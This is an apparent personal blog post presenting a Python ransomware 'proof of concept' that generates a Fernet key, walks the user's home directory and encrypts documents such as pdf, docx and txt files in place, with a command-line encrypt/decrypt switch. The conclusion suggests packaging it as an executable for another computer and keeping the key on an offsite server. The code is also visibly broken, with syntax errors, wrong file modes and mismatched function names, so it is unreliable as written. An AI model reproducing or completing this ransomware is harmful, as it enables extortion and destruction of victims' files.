---
layout: post
title:  "Ransomware Proof of concept"
date:   2020-08-29 6:00:00 +0800
categories: coding
---
<img style="width: inherit;" src="http://hits.dwyl.com/dev-yakuza.github.io{{ https://adrianducao.github.io/coding/2020/08/28/proof-of-concept-ransomware.html }}.svg" alt="hit count image"/>

### Ransomware Concept
The basic of ransomware is it encrypts a specified target file extension using with a key that the attacker had setup on a server somewhere to be used later for later decyption process. There are different programming languges you can use for this but the easiest and fastest way to provide a proof of concept is with python. You can check my code repo here [run-some-crypt](https://github.com/AdrianDucao/run-some-crypt).

#### Content
1. generate a key to be used for encryption and decryption
2. write a key file
3. read a key file
4. scanning directory
5. encypt the target files
6. create cli interface

### generate a key to be used for encryption and decryption
Let's begin by importing the OS module since we can use its functions for interactions with the OS, for encryption we can import the [Fernet(Semantic Encrytion)](https://cryptography.io/en/latest/fernet/) Module.
```
  1 import os
  2 from os.path import expanduser
  3 from cryptography.fernet import Fernet

```

create a class and constructor, below that is the generateKey function
```
  5 class Encrypt:
  6 
  7     def __init__(self):
  8 
  9         self.key = None
 10         self.cryptor = None
 11         self.file_ext_targets = ['pdf','doc','docx','ppt','pptx','txt']
 12 
 13     def generateKey(self):
 14 
 15         self.key = Fernet.generate_key()
 16         self.cryptor = Fernet(self.key)

```

### write a key file
now lets create a function to write the key to a file
```
 23     def writeKey(self, key_filename):
 24         with open.(key_filename, 'b') as f:
 25             f.write(self.key)

```

### read a key file
moving on, create a function to read a key from a file
```
 18     def readKey(self, key_filename):
 19         with open(key_filename, 'a') as f:
 20             self.key = f.read()
 21             self.cryptor = Fernet(self.key)

```

### scanning directory
the function below allows you to scan the directories and check for target filename extensions specified earlier on self.file_ext_targets 
```
 28     def mainCrypt(self, root_dir, encrypted = False):
 29         for root, _, files in os.walk(root_dir):
 30             for f in files:
 31                 abs_file_path = os.path.join(root, f)
 32 
 33                 if not abs_file_path('.')[-1] in self.file_ext_targets:
 34                     continue
 35 
 36                 self.crypt_file(abs_file_path, encrypted = encrypted)

```

### encrypt the target files
function to encrypt the specified filename extensions and check if that file has been encrypted or not
```
 38     def encryptFile(self, file_path, encrypted = False):
 39         with open(file_path, 'a+') as f:
 40             _data = f.read()
 41 
 42             if not encrypted:
 43                 data = self.cryptor.encrypt(_data)
 44             else
 45                 data = self.cryptor.decrypt(_data)
 46 
 47             f.seek(0)
 48             f.write(data)

```

### create a cli interface
how it works is that you call the class we created earlier and create a conditional statement where you can specify and action you want to take e.g. encrypt or decrypt files. 
``` 
 51 if __name__ == '__main__':
 52     #all directory
 53     sys_root = expanduser('~')
 54 
 55     #specific target directory
 56     #local_root= '.'
 57 
 58     import argparse
 59     parser = argparse.ArgumentParser()
 60     parser.add_argument('--action', required=True)
 61     parser.add_argument('--keyfile')
 62 
 63 
 64     args = parser.parse_args()
 65     action = args.action.lower()
 66     keyfile = args.keyfile
 67 
 68     lock = Encrypt()
 69 
 70     if action == 'decrypt':
 71         if keyfile is None:
 72             print('Specify path to keyfile after --keyfile')
 73         else:
 74             lock.read_key(keyfile)
 75             lock.mainCrypt(local_root, encrypted=True)
 76     elif action == 'encrypt':
 77         lock.generate_key()
 78         lock.write_key('keyfile')
 79         lock.mainCrypt(sys_root)


```

### Conclusion
After that typing, you're set and done. If you are planning to use this to another computer, you can create an executable file to run this code set an offsite server to host and store the keyfile for later use. Another use case for this is to make a secure encrypted files inside your flash drive or hard drive, as long as you have the keyfile or know the key you're the only one who can open those files. It's not a matter of if but when the quantum computers will comes to age, privacy and secuity through encryption might disappear. 
```
$ python3 crypt.py --action encrypt

$ python3 crypt.py --action decrypt --keyfile /path/keyfile
```

Happy Hunting.